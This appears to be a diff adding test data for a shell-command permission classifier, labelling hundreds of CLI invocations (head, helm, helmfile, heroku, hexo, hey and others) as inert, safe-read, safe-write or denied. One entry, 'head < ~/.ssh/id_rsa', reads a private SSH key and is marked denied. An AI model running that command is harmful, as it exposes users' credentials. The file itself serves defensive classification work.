+hdiutil verify -debug -h	inert
+hdiutil verify -debug -imagekey x	inert
+hdiutil verify -debug x	inert
+hdiutil verify -h	inert
+hdiutil verify -help	inert
+hdiutil verify -imagekey x	inert
+hdiutil verify -plist	inert
+hdiutil verify -puppetstrings	inert
+hdiutil verify -quiet	inert
+hdiutil verify -srcimagekey x	inert
+hdiutil verify -verbose	inert
+hdiutil verify image.dmg	inert
+hdiutil verify x	inert
+hdiutil x	denied
+head	inert
+head --bytes x	inert
+head --help	inert
+head --help --bytes x	inert
+head --help --quiet	inert
+head --help x	safe-read
+head --lines x	inert
+head --quiet	inert
+head --silent	inert
+head --verbose	inert
+head --version	inert
+head --zero-terminated	inert
+head -20 file.txt	safe-read
+head -20 src/main.rs	safe-read
+head -V	inert
+head -c x	inert
+head -h	inert
+head -n 20 src/main.rs	safe-read
+head -n x	inert
+head -q	inert
+head -q -50 file.txt	safe-read
+head -v	inert
+head -z	inert
+head < ~/.ssh/id_rsa	denied
+head README.md	safe-read
+head x	safe-read
+headerdoc2html	denied
+headerdoc2html --help	denied
+headerdoc2html --version	denied
+headerdoc2html -H	safe-write
+headerdoc2html -H -X	safe-write
+headerdoc2html -H -o x	safe-write
+headerdoc2html -H x	safe-write
+headerdoc2html -X	safe-write
+headerdoc2html -d	safe-write
+headerdoc2html -h	safe-write
+headerdoc2html -o docs/ Header.h	safe-write
+headerdoc2html -o x	safe-write
+headerdoc2html -p	safe-write
+headerdoc2html -q	safe-write
+headerdoc2html -u	safe-write
+headerdoc2html -v	safe-write
+headerdoc2html -x	safe-write
+headerdoc2html x	safe-write
+heap	denied
+heap --help	inert
+heap --help -H	inert
+heap --help -addresses x	inert
+heap --help x	inert
+heap --version	inert
+heap -H	inert
+heap -addresses x	inert
+heap -diffFrom x	inert
+heap -guessNonObjects	inert
+heap -humanReadable	inert
+heap -noContent	inert
+heap -s	inert
+heap -showSizes	inert
+heap -sortBySize	inert
+heap -sumObjectFields	inert
+heap -z	inert
+heap -zones	inert
+heap x	inert
+heif-dec	denied
+heif-dec --decoder x	safe-write
+heif-dec --help	safe-write
+heif-dec --help --decoder x	safe-write
+heif-dec --help --list-decoders	safe-write
+heif-dec --help x	safe-write
+heif-dec --list-decoders	safe-write
+heif-dec --no-colons	safe-write
+heif-dec --output x	safe-write
+heif-dec --png-compression-level x	safe-write
+heif-dec --quality x	safe-write
+heif-dec --quiet	safe-write
+heif-dec --version	safe-write
+heif-dec --with-aux	safe-write
+heif-dec --with-exif	safe-write
+heif-dec --with-xmp	safe-write
+heif-dec -d x	safe-write
+heif-dec -h	safe-write
+heif-dec -o x	safe-write
+heif-dec -q x	safe-write
+heif-dec -v	safe-write
+heif-dec x	safe-write
+heif-enc	denied
+heif-enc --avif	safe-write
+heif-enc --avif --bit-depth x	safe-write
+heif-enc --avif --heic	safe-write
+heif-enc --avif x	safe-write
+heif-enc --bit-depth x	safe-write
+heif-enc --chroma x	safe-write
+heif-enc --colour_primaries x	safe-write
+heif-enc --encoder x	safe-write
+heif-enc --full_range_flag x	safe-write
+heif-enc --heic	safe-write
+heif-enc --help	safe-write
+heif-enc --list-encoder-parameters	safe-write
+heif-enc --list-encoders	safe-write
+heif-enc --lossless	safe-write
+heif-enc --matrix_coefficients x	safe-write
+heif-enc --no-alpha	safe-write
+heif-enc --output x	safe-write
+heif-enc --parameter x	safe-write
+heif-enc --quality x	safe-write
+heif-enc --quiet	safe-write
+heif-enc --thumb x	safe-write
+heif-enc --thumbnail-bbox	safe-write
+heif-enc --transfer_characteristic x	safe-write
+heif-enc --version	safe-write
+heif-enc -L	safe-write
+heif-enc -e x	safe-write
+heif-enc -h	safe-write
+heif-enc -o x	safe-write
+heif-enc -p x	safe-write
+heif-enc -q x	safe-write
+heif-enc -t x	safe-write
+heif-enc -v	safe-write
+heif-enc x	safe-write
+heif-info	denied
+heif-info --dump-boxes	inert
+heif-info --dump-boxes --help	inert
+heif-info --dump-boxes x	inert
+heif-info --help	inert
+heif-info --no-colors	inert
+heif-info --version	inert
+heif-info -h	inert
+heif-info -v	inert
+heif-info x	inert
+heif-thumbnailer	denied
+heif-thumbnailer --help	safe-write
+heif-thumbnailer --help --size x	safe-write
+heif-thumbnailer --help --version	safe-write
+heif-thumbnailer --help x	safe-write
+heif-thumbnailer --size x	safe-write
+heif-thumbnailer --version	safe-write
+heif-thumbnailer -h	safe-write
+heif-thumbnailer -s x	safe-write
+heif-thumbnailer -v	safe-write
+heif-thumbnailer x	safe-write
+helm	denied
+helm --burst-limit x	denied
+helm --ca-file x	denied
+helm --cert-file x	denied
+helm --debug	denied
+helm --debug --burst-limit x	denied
+helm --debug --help	inert
+helm --debug x	denied
+helm --help	inert
+helm --key-file x	denied
+helm --kube-apiserver x	denied
+helm --kube-as-group x	denied
+helm --kube-as-user x	denied
+helm --kube-ca-file x	denied
+helm --kube-context x	denied
+helm --kube-insecure-skip-tls-verify x	denied
+helm --kube-tls-server-name x	denied
+helm --kube-token x	denied
+helm --kubeconfig x	denied
+helm --namespace x	denied
+helm --output-dir x	denied
+helm --registry-config x	denied
+helm --repository-cache x	denied
+helm --repository-config x	denied
+helm --version	denied
+helm -h	inert
+helm -n x	denied
+helm env	inert
+helm env --help	inert
+helm env --help -h	inert
+helm env --help x	inert
+helm env -h	inert
+helm env x	inert
+helm get	denied
+helm get all	denied
+helm get all --help	inert
+helm get all --help --output x	inert
+helm get all --help -h	inert
+helm get all --help x	inert
+helm get all --output x	inert
+helm get all --revision x	inert
+helm get all --template x	inert
+helm get all -h	inert
+helm get all -o x	inert
+helm get all x	inert
+helm get hooks	denied
+helm get hooks --help	inert
+helm get hooks --help --output x	inert
+helm get hooks --help -h	inert
+helm get hooks --help x	inert
+helm get hooks --output x	inert
+helm get hooks --revision x	inert
+helm get hooks -h	inert
+helm get hooks -o x	inert
+helm get hooks x	inert
+helm get manifest	denied
+helm get manifest --help	inert
+helm get manifest --help --output x	inert
+helm get manifest --help -h	inert
+helm get manifest --help x	inert
+helm get manifest --output x	inert
+helm get manifest --revision x	inert
+helm get manifest -h	inert
+helm get manifest -o x	inert
+helm get manifest x	inert
+helm get metadata	denied
+helm get metadata --help	inert
+helm get metadata --help --output x	inert
+helm get metadata --help -h	inert
+helm get metadata --help x	inert
+helm get metadata --output x	inert
+helm get metadata --revision x	inert
+helm get metadata -h	inert
+helm get metadata -o x	inert
+helm get metadata x	inert
+helm get notes	denied
+helm get notes --help	inert
+helm get notes --help --output x	inert
+helm get notes --help -h	inert
+helm get notes --help x	inert
+helm get notes --output x	inert
+helm get notes --revision x	inert
+helm get notes -h	inert
+helm get notes -o x	inert
+helm get notes x	inert
+helm get values	denied
+helm get values --help	inert
+helm get values --help --output x	inert
+helm get values --help -h	inert
+helm get values --help x	inert
+helm get values --output x	inert
+helm get values --revision x	inert
+helm get values -h	inert
+helm get values -o x	inert
+helm get values x	inert
+helm get x	denied
+helm history	denied
+helm history --help	inert
+helm history --help --max x	inert
+helm history --help -h	inert
+helm history --help x	inert
+helm history --max x	inert
+helm history --output x	inert
+helm history -h	inert
+helm history -o x	inert
+helm history x	inert
+helm lint	denied
+helm lint --help	inert
+helm lint --help --quiet	inert
+helm lint --help --set x	inert
+helm lint --help x	inert
+helm lint --quiet	inert
+helm lint --set x	inert
+helm lint --set-file x	inert
+helm lint --set-json x	inert
+helm lint --set-string x	inert
+helm lint --strict	inert
+helm lint --values x	inert
+helm lint --with-subcharts	inert
+helm lint -f x	inert
+helm lint -h	inert
+helm lint x	inert
+helm list	inert
+helm list --all	inert
+helm list --all --all-namespaces	inert
+helm list --all --filter x	inert
+helm list --all x	inert
+helm list --all-namespaces	inert
+helm list --deployed	inert
+helm list --failed	inert
+helm list --filter x	inert
+helm list --help	inert
+helm list --max x	inert
+helm list --offset x	inert
+helm list --output x	inert
+helm list --pending	inert
+helm list --reverse	inert
+helm list --short	inert
+helm list --superseded	inert
+helm list --time-format x	inert
+helm list --uninstalled	inert
+helm list --uninstalling	inert
+helm list -A	inert
+helm list -a	inert
+helm list -h	inert
+helm list -o x	inert
+helm list -q	inert
+helm list x	inert
+helm search	denied
+helm search hub	denied
+helm search hub --help	inert
+helm search hub --help --list-repo-url	inert
+helm search hub --help --max-col-width x	inert
+helm search hub --help x	inert
+helm search hub --list-repo-url	inert
+helm search hub --max-col-width x	inert
+helm search hub --output x	inert
+helm search hub -h	inert
+helm search hub -o x	inert
+helm search hub x	inert
+helm search repo	denied
+helm search repo --devel	inert
+helm search repo --devel --help	inert
+helm search repo --devel --max-col-width x	inert
+helm search repo --devel x	inert
+helm search repo --help	inert
+helm search repo --max-col-width x	inert
+helm search repo --output x	inert
+helm search repo --regexp	inert
+helm search repo --version x	inert
+helm search repo --versions	inert
+helm search repo -h	inert
+helm search repo -l	inert
+helm search repo -o x	inert
+helm search repo -r	inert
+helm search repo x	inert
+helm search x	denied
+helm show	denied
+helm show all	denied
+helm show all --ca-file x	inert
+helm show all --cert-file x	inert
+helm show all --devel	inert
+helm show all --devel --ca-file x	inert
+helm show all --devel --help	inert
+helm show all --devel x	inert
+helm show all --help	inert
+helm show all --key-file x	inert
+helm show all --keyring x	inert
+helm show all --repo x	inert
+helm show all --username x	inert
+helm show all --version x	inert
+helm show all -h	inert
+helm show all x	inert
+helm show chart	denied
+helm show chart --devel	inert
+helm show chart --devel --help	inert
+helm show chart --devel --repo x	inert
+helm show chart --devel x	inert
+helm show chart --help	inert
+helm show chart --repo x	inert
+helm show chart --version x	inert
+helm show chart -h	inert
+helm show chart x	inert
+helm show crds	denied
+helm show crds --devel	inert
+helm show crds --devel --help	inert
+helm show crds --devel --repo x	inert
+helm show crds --devel x	inert
+helm show crds --help	inert
+helm show crds --repo x	inert
+helm show crds --version x	inert
+helm show crds -h	inert
+helm show crds x	inert
+helm show readme	denied
+helm show readme --devel	inert
+helm show readme --devel --help	inert
+helm show readme --devel --repo x	inert
+helm show readme --devel x	inert
+helm show readme --help	inert
+helm show readme --repo x	inert
+helm show readme --version x	inert
+helm show readme -h	inert
+helm show readme x	inert
+helm show values	denied
+helm show values --devel	inert
+helm show values --devel --help	inert
+helm show values --devel --jsonpath x	inert
+helm show values --devel x	inert
+helm show values --help	inert
+helm show values --jsonpath x	inert
+helm show values --repo x	inert
+helm show values --version x	inert
+helm show values -h	inert
+helm show values x	inert
+helm show x	denied
+helm status	denied
+helm status --help	inert
+helm status --help --output x	inert
+helm status --help --show-desc	inert
+helm status --help x	inert
+helm status --output x	inert
+helm status --revision x	inert
+helm status --show-desc	inert
+helm status --show-resources	inert
+helm status -h	inert
+helm status -o x	inert
+helm status x	inert
+helm template	denied
+helm template --api-versions	inert
+helm template --api-versions --create-namespace	inert
+helm template --api-versions --kube-version x	inert
+helm template --api-versions x	inert
+helm template --create-namespace	inert
+helm template --dependency-update	inert
+helm template --devel	inert
+helm template --dry-run	inert
+helm template --generate-name	inert
+helm template --help	inert
+helm template --include-crds	inert
+helm template --is-upgrade	inert
+helm template --kube-version x	inert
+helm template --name-template x	inert
+helm template --namespace x	inert
+helm template --no-hooks	inert
+helm template --output-dir x	inert
+helm template --post-renderer x	inert
+helm template --release-name	inert
+helm template --replace	inert
+helm template --repo x	inert
+helm template --set x	inert
+helm template --set-file x	inert
+helm template --set-json x	inert
+helm template --set-string x	inert
+helm template --show-only x	inert
+helm template --skip-crds	inert
+helm template --skip-tests	inert
+helm template --timeout x	inert
+helm template --validate	inert
+helm template --values x	inert
+helm template --version x	inert
+helm template -f x	inert
+helm template -g	inert
+helm template -h	inert
+helm template -n x	inert
+helm template -s x	inert
+helm template x	inert
+helm verify	denied
+helm verify --help	inert
+helm verify --help --keyring x	inert
+helm verify --help -h	inert
+helm verify --help x	inert
+helm verify --keyring x	inert
+helm verify -h	inert
+helm verify x	inert
+helm version	inert
+helm version --help	inert
+helm version --help --short	inert
+helm version --help x	inert
+helm version --short	inert
+helm version --template	inert
+helm version -h	inert
+helm version x	inert
+helm x	denied
+helmfile	denied
+helmfile --allow-no-matching-release	denied
+helmfile --allow-no-matching-release --args x	denied
+helmfile --allow-no-matching-release --debug	denied
+helmfile --allow-no-matching-release x	denied
+helmfile --args x	denied
+helmfile --color x	denied
+helmfile --debug	denied
+helmfile --disable-force-update	denied
+helmfile --enable-live-output	denied
+helmfile --environment x	denied
+helmfile --file x	denied
+helmfile --helm-binary x	denied
+helmfile --helmfile x	denied
+helmfile --help	inert
+helmfile --kube-context x	denied
+helmfile --log-level x	denied
+helmfile --namespace x	denied
+helmfile --no-color	denied
+helmfile --output-dir x	denied
+helmfile --quiet	denied
+helmfile --strict-parsing	denied
+helmfile --version	inert
+helmfile -b x	denied
+helmfile -e x	denied
+helmfile -f ./helmfile.yaml list	safe-read
+helmfile -f /etc/h.yaml list	denied
+helmfile -f x	denied
+helmfile -h	inert
+helmfile -l x	denied
+helmfile -n x	denied
+helmfile -v	inert
+helmfile apply	denied
+helmfile apply x	denied
+helmfile build	denied
+helmfile build x	denied
+helmfile cache	inert
+helmfile cache cleanup	denied
+helmfile cache cleanup x	denied
+helmfile cache info	inert
+helmfile cache info --help	inert
+helmfile cache info --help -h	inert
+helmfile cache info --help x	inert
+helmfile cache info -h	inert
+helmfile cache info x	inert
+helmfile cache list	inert
+helmfile cache list --help	inert
+helmfile cache list --help -h	inert
+helmfile cache list --help x	inert
+helmfile cache list -h	inert
+helmfile cache list x	inert
+helmfile cache x	denied
+helmfile chart	denied
+helmfile chart x	denied
+helmfile delete	denied
+helmfile delete x	denied
+helmfile deps	denied
+helmfile deps x	denied
+helmfile destroy	denied
+helmfile destroy x	denied
+helmfile diff	safe-read
+helmfile diff --args x	safe-read
+helmfile diff --concurrency x	safe-read
+helmfile diff --context	safe-read
+helmfile diff --context --args x	safe-read
+helmfile diff --context --detailed-exitcode	safe-read
+helmfile diff --context x	safe-read
+helmfile diff --detailed-exitcode	safe-read
+helmfile diff --help	safe-read
+helmfile diff --include-needs	safe-read
+helmfile diff --include-tests	safe-read
+helmfile diff --include-transitive-needs	safe-read
+helmfile diff --no-hooks	safe-read
+helmfile diff --reset-values x	safe-read
+helmfile diff --retain-values-files x	safe-read
+helmfile diff --selector x	safe-read
+helmfile diff --set x	safe-read
+helmfile diff --show-only x	safe-read
+helmfile diff --show-secrets	safe-read
+helmfile diff --skip-cleanup	safe-read
+helmfile diff --skip-deps	safe-read
+helmfile diff --skip-needs	safe-read
+helmfile diff --suppress-diff	safe-read
+helmfile diff --suppress-secrets	safe-read
+helmfile diff --three-way-merge	safe-read
+helmfile diff --values x	safe-read
+helmfile diff -h	safe-read
+helmfile diff -l x	safe-read
+helmfile diff x	safe-read
+helmfile fetch	safe-write
+helmfile fetch --concurrency x	safe-write
+helmfile fetch --help	safe-write
+helmfile fetch --help --concurrency x	safe-write
+helmfile fetch --help --skip-cleanup	safe-write
+helmfile fetch --help x	safe-write
+helmfile fetch --output-dir x	safe-write
+helmfile fetch --selector x	safe-write
+helmfile fetch --skip-cleanup	safe-write
+helmfile fetch --skip-deps	safe-write
+helmfile fetch -h	safe-write
+helmfile fetch -l x	safe-write
+helmfile fetch x	safe-write
+helmfile help	inert
+helmfile help x	inert
+helmfile init	denied
+helmfile init x	denied
+helmfile lint	safe-read
+helmfile lint --args x	safe-read
+helmfile lint --concurrency x	safe-read
+helmfile lint --help	safe-read
+helmfile lint --help --args x	safe-read
+helmfile lint --help --include-transitive-needs	safe-read
+helmfile lint --help x	safe-read
+helmfile lint --include-transitive-needs	safe-read
+helmfile lint --selector x	safe-read
+helmfile lint --skip-deps	safe-read
+helmfile lint --skip-needs	safe-read
+helmfile lint --values x	safe-read
+helmfile lint -h	safe-read
+helmfile lint -l x	safe-read
+helmfile lint x	safe-read
+helmfile list	safe-read
+helmfile list --help	safe-read
+helmfile list --help --keep-temp-dir	safe-read
+helmfile list --help --output x	safe-read
+helmfile list --help x	safe-read
+helmfile list --keep-temp-dir	safe-read
+helmfile list --output	safe-read
+helmfile list --output x	safe-read
+helmfile list --selector x	safe-read
+helmfile list --skip-charts	safe-read
+helmfile list -h	safe-read
+helmfile list -l x	safe-read
+helmfile list x	safe-read
+helmfile repos	denied
+helmfile repos x	denied
+helmfile rollback	denied
+helmfile rollback x	denied
+helmfile status	safe-read
+helmfile status --args x	safe-read
+helmfile status --concurrency x	safe-read
+helmfile status --help	safe-read
+helmfile status --help --args x	safe-read
+helmfile status --help -h	safe-read
+helmfile status --help x	safe-read
+helmfile status --selector x	safe-read
+helmfile status -h	safe-read
+helmfile status -l x	safe-read
+helmfile status x	safe-read
+helmfile sync	denied
+helmfile sync x	denied
+helmfile template	safe-read
+helmfile template --args x	safe-read
+helmfile template --concurrency x	safe-read
+helmfile template --debug x	safe-read
+helmfile template --help	safe-read
+helmfile template --help --args x	safe-read
+helmfile template --help --include-crds	safe-read
+helmfile template --help x	safe-read
+helmfile template --include-crds	safe-read
+helmfile template --include-needs	safe-read
+helmfile template --include-transitive-needs	safe-read
+helmfile template --no-hooks	safe-read
+helmfile template --output-dir x	safe-read
+helmfile template --output-dir-template x	safe-read
+helmfile template --selector x	safe-read
+helmfile template --set x	safe-read
+helmfile template --show-only x	safe-read
+helmfile template --skip-cleanup	safe-read
+helmfile template --skip-deps	safe-read
+helmfile template --skip-needs	safe-read
+helmfile template --skip-tests	safe-read
+helmfile template --validate	safe-read
+helmfile template --values x	safe-read
+helmfile template -h	safe-read
+helmfile template -l x	safe-read
+helmfile template x	safe-read
+helmfile test	denied
+helmfile test x	denied
+helmfile version	inert
+helmfile version --full	inert
+helmfile version --full --help	inert
+helmfile version --full --output x	inert
+helmfile version --full x	inert
+helmfile version --help	inert
+helmfile version --output	inert
+helmfile version --output x	inert
+helmfile version -h	inert
+helmfile version -o x	inert
+helmfile version x	inert
+helmfile write-values	denied
+helmfile write-values x	denied
+helmfile x	denied
+herb	denied
+herb --config-file x	denied
+herb --help	inert
+herb --help --config-file x	denied
+herb --help --version	denied
+herb --help x	denied
+herb --version	inert
+herb -V	inert
+herb -c x	denied
+herb -h	inert
+herb analyze	inert
+herb analyze --config x	inert
+herb analyze --format x	inert
+herb analyze --help	inert
+herb analyze --help --config x	inert
+herb analyze --help --json	inert
+herb analyze --help x	inert
+herb analyze --json	inert
+herb analyze -h	inert
+herb analyze -j	inert
+herb analyze x	inert
+herb format	safe-read
+herb format --check	safe-read
+herb format --check --color	safe-read
+herb format --check --config x	safe-read
+herb format --check app/views	safe-read
+herb format --check x	safe-read
+herb format --color	safe-read
+herb format --config x	safe-read
+herb format --help	safe-read
+herb format --no-color	safe-read
+herb format --write	safe-write
+herb format --write app/views/home/index.html.erb	safe-write
+herb format -h	safe-read
+herb format -w	safe-write
+herb format x	safe-read
+herb lint	safe-read
+herb lint --config-file x	safe-read
+herb lint --disable-failing	safe-read
+herb lint --disable-failing --config-file x	safe-read
+herb lint --disable-failing --fix	safe-write
+herb lint --disable-failing x	safe-read
+herb lint --fail-level x	safe-read
+herb lint --fix	safe-write
+herb lint --fix app/views/home/index.html.erb	safe-write
+herb lint --fix-unsafely	safe-read
+herb lint --force	safe-read
+herb lint --format x	safe-read
+herb lint --github	safe-read
+herb lint --help	safe-read
+herb lint --ignore-disable-comments	safe-read
+herb lint --init	safe-read
+herb lint --jobs x	safe-read
+herb lint --json	safe-read
+herb lint --no-custom-rules	safe-read
+herb lint --no-github	safe-read
+herb lint --simple	safe-read
+herb lint --theme x	safe-read
+herb lint --upgrade	safe-read
+herb lint --version	safe-read
+herb lint -c x	safe-read
+herb lint -h	safe-read
+herb lint -j x	safe-read
+herb lint -v	safe-read
+herb lint app/views	safe-read
+herb lint x	safe-read
+herb parse	denied
+herb parse --help	inert
+herb parse --help --json	inert
+herb parse --help x	inert
+herb parse --json	inert
+herb parse --no-color	inert
+herb parse -h	inert
+herb parse -j	inert
+herb parse app/views/layouts/application.html.erb	inert
+herb parse x	inert
+herb x	denied
+heroku	denied
+heroku --help	inert
+heroku --help --version	denied
+heroku --help x	denied
+heroku --version	inert
+heroku -V	inert
+heroku -h	inert
+heroku addons	inert
+heroku addons --all	inert
+heroku addons --all --app x	inert
+heroku addons --all --help	inert
+heroku addons --all x	inert
+heroku addons --app x	inert
+heroku addons --help	inert
+heroku addons --json	inert
+heroku addons -A	inert
+heroku addons -a x	inert
+heroku addons -h	inert
+heroku addons x	inert
+heroku apps	inert
+heroku apps --all	inert
+heroku apps --all --help	inert
+heroku apps --all --space x	inert
+heroku apps --all x	inert
+heroku apps --help	inert
+heroku apps --json	inert
+heroku apps --space x	inert
+heroku apps --team x	inert
+heroku apps -a	inert
+heroku apps -h	inert
+heroku apps -s x	inert
+heroku apps -t x	inert
+heroku apps x	inert
+heroku apps:info	inert
+heroku apps:info --app x	inert
+heroku apps:info --help	inert
+heroku apps:info --help --app x	inert
+heroku apps:info --help --json	inert
+heroku apps:info --help x	inert
+heroku apps:info --json	inert
+heroku apps:info --shell	inert
+heroku apps:info -a x	inert
+heroku apps:info -h	inert
+heroku apps:info -s	inert
+heroku apps:info x	inert
+heroku buildpacks	inert
+heroku buildpacks --app x	inert
+heroku buildpacks --help	inert
+heroku buildpacks --help --app x	inert
+heroku buildpacks --help -h	inert
+heroku buildpacks --help x	inert
+heroku buildpacks -a x	inert
+heroku buildpacks -h	inert
+heroku buildpacks x	inert
+heroku config	denied
+heroku config --app x	denied
+heroku config --help	denied
+heroku config --help --app x	denied
+heroku config --help --json	denied
+heroku config --help x	denied
+heroku config --json	denied
+heroku config --shell	denied
+heroku config -a x	denied
+heroku config -h	denied
+heroku config -j	denied
+heroku config -s	denied
+heroku config x	denied
+heroku logs	inert
+heroku logs --app x	inert
+heroku logs --dyno x	inert
+heroku logs --force-colors	inert
+heroku logs --force-colors --app x	inert
+heroku logs --force-colors --help	inert
+heroku logs --force-colors x	inert
+heroku logs --help	inert
+heroku logs --num x	inert
+heroku logs --source x	inert
+heroku logs --tail	inert
+heroku logs -a x	inert
+heroku logs -d x	inert
+heroku logs -h	inert
+heroku logs -n x	inert
+heroku logs -s x	inert
+heroku logs -t	inert
+heroku logs x	inert
+heroku ps	inert
+heroku ps --app x	inert
+heroku ps --help	inert
+heroku ps --help --app x	inert
+heroku ps --help --json	inert
+heroku ps --help x	inert
+heroku ps --json	inert
+heroku ps -a x	inert
+heroku ps -h	inert
+heroku ps -j	inert
+heroku ps x	inert
+heroku regions	inert
+heroku regions --help	inert
+heroku regions --help --json	inert
+heroku regions --help x	inert
+heroku regions --json	inert
+heroku regions -h	inert
+heroku regions x	inert
+heroku releases	inert
+heroku releases --app x	inert
+heroku releases --help	inert
+heroku releases --help --app x	inert
+heroku releases --help --json	inert
+heroku releases --help x	inert
+heroku releases --json	inert
+heroku releases --num x	inert
+heroku releases -a x	inert
+heroku releases -h	inert
+heroku releases -j	inert
+heroku releases -n x	inert
+heroku releases x	inert
+heroku status	inert
+heroku status --help	inert
+heroku status --help --json	inert
+heroku status --help x	inert
+heroku status --json	inert
+heroku status -h	inert
+heroku status x	inert
+heroku x	denied
+hexdump	inert
+hexdump --help	inert
+hexdump --help --version	inert
+hexdump --help -L x	inert
+hexdump --help x	inert
+hexdump --version	inert
+hexdump -C	inert
+hexdump -C file.bin	inert
+hexdump -L x	inert
+hexdump -V	inert
+hexdump -b	inert
+hexdump -c	inert
+hexdump -d	inert
+hexdump -e x	inert
+hexdump -f x	inert
+hexdump -h	inert
+hexdump -n x	inert
+hexdump -o	inert
+hexdump -s x	inert
+hexdump -v	inert
+hexdump -x	inert
+hexdump x	inert
+hexo	denied
+hexo --help	inert
+hexo --help --output x	denied
+hexo --help --version	denied
+hexo --help x	denied
+hexo --output x	denied
+hexo --version	inert
+hexo -h	inert
+hexo -o x	denied
+hexo -v	inert
+hexo clean	safe-write
+hexo clean --help	safe-write
+hexo clean --help -h	safe-write
+hexo clean --help x	safe-write
+hexo clean -h	safe-write
+hexo clean x	safe-write
+hexo config	inert
+hexo config --help	inert
+hexo config --help -h	inert
+hexo config --help x	inert
+hexo config -h	inert
+hexo config x	inert
+hexo deploy	denied
+hexo deploy x	denied
+hexo g	safe-write
+hexo g --bail	safe-write
+hexo g --bail --concurrency x	safe-write
+hexo g --bail --debug	safe-write
+hexo g --bail x	safe-write
+hexo g --concurrency x	safe-write
+hexo g --debug	safe-write
+hexo g --deploy	safe-write
+hexo g --draft	safe-write
+hexo g --drafts	safe-write
+hexo g --force	safe-write
+hexo g --help	safe-write
+hexo g --silent	safe-write
+hexo g --verbose	safe-write
+hexo g --watch	safe-write
+hexo g -c x	safe-write
+hexo g -d	safe-write
+hexo g -f	safe-write
+hexo g -h	safe-write
+hexo g -w	safe-write
+hexo g x	safe-write
+hexo generate	safe-write
+hexo generate --bail	safe-write
+hexo generate --bail --concurrency x	safe-write
+hexo generate --bail --debug	safe-write
+hexo generate --bail x	safe-write
+hexo generate --concurrency x	safe-write
+hexo generate --debug	safe-write
+hexo generate --deploy	safe-write
+hexo generate --draft	safe-write
+hexo generate --drafts	safe-write
+hexo generate --force	safe-write
+hexo generate --help	safe-write
+hexo generate --silent	safe-write
+hexo generate --verbose	safe-write
+hexo generate --watch	safe-write
+hexo generate -c x	safe-write
+hexo generate -d	safe-write
+hexo generate -f	safe-write
+hexo generate -h	safe-write
+hexo generate -w	safe-write
+hexo generate x	safe-write
+hexo help	inert
+hexo help x	inert
+hexo init	safe-write
+hexo init --clone	safe-write
+hexo init --clone --debug	safe-write
+hexo init --clone x	safe-write
+hexo init --debug	safe-write
+hexo init --draft	safe-write
+hexo init --drafts	safe-write
+hexo init --help	safe-write
+hexo init --no-clone	safe-write
+hexo init --silent	safe-write
+hexo init --verbose	safe-write
+hexo init -h	safe-write
+hexo init x	safe-write
+hexo list	denied
+hexo list --help	inert
+hexo list --help -h	inert
+hexo list --help x	inert
+hexo list -h	inert
+hexo list page	inert
+hexo list x	inert
+hexo migrate	denied
+hexo migrate x	denied
+hexo new	denied
+hexo new --draft	safe-write
+hexo new --draft --drafts	safe-write
+hexo new --draft --path x	safe-write
+hexo new --draft x	safe-write
+hexo new --drafts	safe-write
+hexo new --help	safe-write
+hexo new --path x	safe-write
+hexo new --replace	safe-write
+hexo new --slug	safe-write
+hexo new -h	safe-write
+hexo new -p x	safe-write
+hexo new -r	safe-write
+hexo new -s	safe-write
+hexo new x	safe-write
+hexo publish	denied
+hexo publish x	denied
+hexo render	denied
+hexo render --engine x	safe-read
+hexo render --help	safe-read
+hexo render --help --engine x	safe-read
+hexo render --help --output	safe-write
+hexo render --help x	safe-read
+hexo render --output	safe-write
+hexo render --output x	safe-write
+hexo render -e x	safe-read
+hexo render -h	safe-read
+hexo render -o	safe-write
+hexo render -o x	safe-write
+hexo render source/_posts/hello.md -o ./rendered.html	safe-write
+hexo render src/foo.md	safe-read
+hexo render src/foo.md --output out.html	safe-write
+hexo render src/foo.md -o out.html	safe-write
+hexo render x	safe-read
+hexo server	denied
+hexo server x	denied
+hexo version	inert
+hexo version --help	inert
+hexo version --help -h	inert
+hexo version --help x	inert
+hexo version -h	inert
+hexo version x	inert
+hexo x	denied
+hey	denied
+hey --help	inert
+hey --help --version	denied
+hey --help x	denied
+hey --version	inert
+hey -h	inert
+hey -v	inert
+hey auth	denied
+hey auth login	denied
+hey auth login x	denied
+hey auth logout	safe-write
+hey auth logout --help	safe-write
+hey auth logout --help -h	safe-write
+hey auth logout --help x	safe-write
+hey auth logout -h	safe-write
+hey auth logout x	safe-write
+hey auth refresh	denied
+hey auth refresh x	denied
+hey auth status	inert
+hey auth status --help	inert
+hey auth status --help --json	inert
+hey auth status --help x	inert
+hey auth status --json	inert
+hey auth status -h	inert
+hey auth status x	inert
+hey auth token	denied
+hey auth token x	denied
+hey auth x	denied
+hey box	denied
+hey box --base-url x	inert
+hey box --cookie x	inert
+hey box --help	inert
+hey box --help --base-url x	inert
+hey box --help --json	inert
+hey box --help x	inert
+hey box --json	inert
+hey box --token x	inert
+hey box -h	inert
+hey box imbox	inert
+hey box x	inert
+hey boxes	inert
+hey boxes --base-url x	inert
+hey boxes --cookie x	inert
+hey boxes --help	inert
+hey boxes --help --base-url x	inert
+hey boxes --help --json	inert
+hey boxes --help x	inert
+hey boxes --json	inert
+hey boxes --token x	inert
+hey boxes -h	inert
+hey boxes x	inert
+hey calendars	inert
+hey calendars --base-url x	inert
+hey calendars --cookie x	inert
+hey calendars --help	inert
+hey calendars --help --base-url x	inert
+hey calendars --help --json	inert
+hey calendars --help x	inert
+hey calendars --json	inert
+hey calendars --token x	inert
+hey calendars -h	inert
+hey calendars x	inert
+hey compose	denied
+hey compose x	denied
+hey drafts	inert
+hey drafts --base-url x	inert
+hey drafts --cookie x	inert
+hey drafts --help	inert
+hey drafts --help --base-url x	inert
+hey drafts --help --json	inert
+hey drafts --help x	inert
+hey drafts --json	inert
+hey drafts --token x	inert
+hey drafts -h	inert
+hey drafts x	inert
+hey habit	denied
+hey habit x	denied
+hey journal	denied
+hey journal list	inert
+hey journal list --base-url x	inert
+hey journal list --cookie x	inert
+hey journal list --help	inert
+hey journal list --help --base-url x	inert
+hey journal list --help --json	inert
+hey journal list --help x	inert
+hey journal list --json	inert
+hey journal list --token x	inert
+hey journal list -h	inert
+hey journal list x	inert
+hey journal read	inert
+hey journal read --base-url x	inert
+hey journal read --cookie x	inert
+hey journal read --help	inert
+hey journal read --help --base-url x	inert
+hey journal read --help --json	inert
+hey journal read --help x	inert
+hey journal read --json	inert
+hey journal read --token x	inert
+hey journal read -h	inert
+hey journal read x	inert
+hey journal write	denied
+hey journal write x	denied
+hey journal x	denied
+hey recordings	denied
+hey recordings --base-url x	inert
+hey recordings --cookie x	inert
+hey recordings --ends-on x	inert
+hey recordings --help	inert
+hey recordings --help --base-url x	inert
+hey recordings --help --json	inert
